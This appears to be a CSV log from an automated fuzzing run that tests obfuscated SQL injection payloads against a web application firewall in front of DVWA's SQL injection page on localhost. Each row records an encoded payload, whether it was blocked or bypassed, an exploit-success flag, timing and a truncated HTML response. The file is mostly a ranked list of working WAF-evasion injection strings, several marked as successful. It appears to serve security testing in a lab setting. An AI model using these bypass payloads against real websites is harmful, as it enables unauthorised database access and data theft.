Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=1.%0bor%0bnot+{`if`%0b1}=1=+(not+{x%0b(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0285,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+!+1=%0b(!~false)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0392,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0b!+{x+(select+1)}=1=%0b(!%0b{a+1}=1)--,Blocked,No,None,Invalid,0.0398,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||+!+{`if`+1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.0208,71.63,No,500,
0%27<@=1.+or+not%0b{`if`%0b1}=1=+(!%7efalse)+||',Bypassed,No,None,Invalid,0.0404,71.63,No,500,
0%27<@!=1+or+not+1=+(not+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0313,71.63,No,500,
0%27<@=1.%0b||+!%0b{x+(select%0b1)}=1=%0b(!%0b{a+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0285,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot%0b{a%0b1}=1=+(not+{`if`%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.0261,71.63,No,500,
0%27<@=.1+||+not+{x+(select+1)}=1=%0b(not%0b{a%0b1}=1)+,Blocked,No,None,Invalid,0.0316,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||%0bnot+{x+(select+1)}=1=%0b(not+true)+or',Blocked,No,None,Invalid,0.0335,69.68,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0bor+!+{x+(select%0b1)}=1=%0b(not+{a+1}=1)%0b,Bypassed,No,None,Invalid,0.0341,70.0,No,500,
0%27<@=.1+||+not+{`if`%0b1}=1=+(!%7e0)%0b||',Bypassed,No,None,Invalid,0.0361,70.52,No,500,
0'<@!=.1+or%0b!+{`if`%0b1}=1=+(false)%0b||%27,Bypassed,No,None,Invalid,0.0196,71.04,No,500,
0'<@=1.%0b||+!+{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)--,Bypassed,No,None,Invalid,0.0236,71.13,No,500,
0'<@!=1%0bor%0bfalse=+(not+{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0572,71.21,No,500,
0%27<@=1.+or%0bnot+{a+1}=1=%0b(0)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0491,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0b!+{x%0b(select%0b1)}=1=+(false)+||%27,Bypassed,No,None,Invalid,0.0356,71.21,No,500,
0'<@!=1.+||%0b0=+(not+1)%23,Blocked,No,None,Invalid,0.0193,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or%0b@<@+or+!%0b{x+(select+1)}=1=%0b(not%0b{a%0b1}=1,Blocked,No,None,Invalid,0.0157,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||%0bnot%0b{x+(select+1)}=1=%0b(!%7efalse)%0b||%27,Blocked,No,None,Invalid,0.0072,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or%0bnot%0b{`if`%0b1}=1=%0b(!+{a+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0403,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||+!+{a+1}=1=+(not+{x+(select%0b1)}=1)%0b,Blocked,No,None,Invalid,0.0222,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or+not%0b{x%0b(select%0b1)}=1=%0b(not%0b{a+1}=1)%23,Bypassed,No,None,Invalid,0.0204,71.21,No,500,
0'<@!=.1+||+{x+(select+1)}=1%0blike%0b{a+1}=1--+,Blocked,No,None,Invalid,0.0303,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or+1<@.+or+!%7e0=%0b(!+{`if`+1}=1)%0bor',Bypassed,No,None,Invalid,0.0141,71.21,No,500,
0'<@=1.+||+not%0b1=%0b(not%0btrue)+||%27,Bypassed,No,None,Invalid,0.0272,71.21,No,500,
0'<@!=1.+||%0bnot~false=+(0)+||',Blocked,No,None,Invalid,0.0305,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or+@<@.+or+!+{`if`%0b1}=1=%0b(not%0b{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0149,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0bnot~0=+(not+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0402,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0bnot%0btrue=%0b(not%0b{`if`+1}=1)+or',Blocked,No,None,Invalid,0.0447,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+||+false=+(0)--%0b,Blocked,No,None,Invalid,0.0376,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+not+{x%0b(select+1)}=1=%0b(not%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0407,71.21,No,500,
0%27<@=1+or+!%0b{a%0b1}=1=+(not%0b{a%0b1}=1)+||',Bypassed,No,None,Invalid,0.0669,71.21,No,500,
0'<@!=1.%0b||+not%0b{x%0b(select+1)}=1=+(not%0b{a+1}=1)--,Bypassed,No,None,Invalid,0.0385,71.21,No,500,
0'<@!=1+||%0b!+{x+(select+1)}=1=+(not%7efalse)+or%27,Blocked,No,None,Invalid,0.019,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||+!+{x%0b(select%0b1)}=1=+(!%0b{a+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0326,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||%0bnot%0b{x+(select+1)}=1=+(not+{x+(select+1)}=1,Blocked,No,None,Invalid,0.0151,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or+false=+(not+{a+1}=1)--%0b,Blocked,No,None,Invalid,0.0134,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or%0bnot%0b{`if`%0b1}=1=+(!+{x%0b(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0279,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+1<@.%0bor%0b!%0b{x%0b(select%0b1)}=1=%0b(!%0b{x%0b(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0213,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+not+1=%0b(!%0btrue)%0bor%27,Bypassed,No,None,Invalid,0.0165,71.21,No,500,
0%27<@!=.1+||+!+{a+1}=1=%0b(not+{`if`+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0174,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+!+{`if`%0b1}=1=+(not+1)%0b||',Bypassed,No,None,Invalid,0.0222,71.31,No,500,
0'<@=1.%0bor%0bnot~false=%0b(!+true)+||%27,Bypassed,No,None,Invalid,0.0337,71.63,No,500,
0'<@!=1%0bor+!+{`if`+1}=1=+(!+{x%0b(select+1)}=1)--,Bypassed,No,None,Invalid,0.0594,71.63,No,500,
0%27<@=1+or+not%0b{x%0b(select%0b1)}=1=+(!%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.016,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'||+@<@.%0bor%0b{x+(select+1)}=1%0blike%0b{x%0b(select+1)}=1+||',Bypassed,No,None,Invalid,0.0224,71.63,No,500,
0'or+1<@%0b||%0b!+{x+(select+1)}=1=+(not%0b{x+(select,Blocked,No,None,Invalid,0.0045,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or+not+1=%0b(!+1)%0bor',Bypassed,No,None,Invalid,0.0313,71.63,No,500,
0%27<@!=1+or+not+{x+(select%0b1)}=1=%0b(!~0)+or',Blocked,No,None,Invalid,0.036,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||%0b!%7efalse=+(not%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0547,71.63,No,500,
0%27<@=1.+or+not%0b{x%0b(select+1)}=1=+(not+{a+1}=1)--,Bypassed,Yes,Yes (unionAtk),Invalid,0.038,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not+{a+1}=1=+(false)+||',Blocked,No,None,Invalid,0.0264,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor%0b!%0btrue=+(!%0b{a%0b1}=1)--+,Bypassed,No,None,Invalid,0.0145,71.63,No,500,
0'<@!=1.%0bor%0bnot+{x+(select%0b1)}=1=%0b(not+{x+(select%0b1)}=1),Bypassed,No,None,Invalid,0.0321,71.63,No,500,
0%27<@=1+or+not%0b{x+(select%0b1)}=1=%0b(!%0b{a+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0347,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+not+{a+1}=1=+(!%0btrue)+or',Bypassed,No,None,Invalid,0.022,71.63,No,500,
0'<@=.1%0b||+not%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0b,Bypassed,No,None,Invalid,0.0382,71.63,No,500,
0'<@=1.+or%0b!%7efalse=%0b(false)+||%27,Blocked,No,None,Invalid,0.0338,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or%0b!%7efalse=%0b(not+{`if`%0b1}=1)%0bor',Bypassed,No,None,Invalid,0.0199,69.68,No,500,
0%27<@=1.%0bor%0bnot+{x+(select+1)}=1=+(0)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0179,70.0,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||+!+{`if`%0b1}=1=%0b(!+{x+(select+1)}=1)--,Bypassed,No,None,Invalid,0.0198,70.0,No,500,
0'<@!=1.+||+not%0b1=+(not%0b{`if`+1}=1)--%0b,Bypassed,No,None,Invalid,0.0221,70.18,No,500,
0'<@!=.1+or+!+true=%0b(not%7e0)+or',Bypassed,No,None,Invalid,0.0228,71.05,No,500,
0%27<@=1%0b||+!%0b{x%0b(select%0b1)}=1=+(!%0b1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0279,71.04,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not+true=+(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.0225,71.19,No,500,
0'<@=1.%0bor+not+{x+(select%0b1)}=1=%0b(!%7efalse)+||%27,Bypassed,No,None,Invalid,0.0266,71.21,No,500,
0%27<@=1.+||+!%0b{a%0b1}=1=%0b(not+{`if`%0b1}=1)+or',Bypassed,No,None,Invalid,0.0432,71.21,No,500,
0%27<@!=1+||%0b!+{a+1}=1=+(not%0b{a+1}=1)%0b||',Bypassed,No,None,Invalid,0.028,71.21,No,500,
0'<@=.1+or+false=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Invalid,0.0239,71.21,No,500,
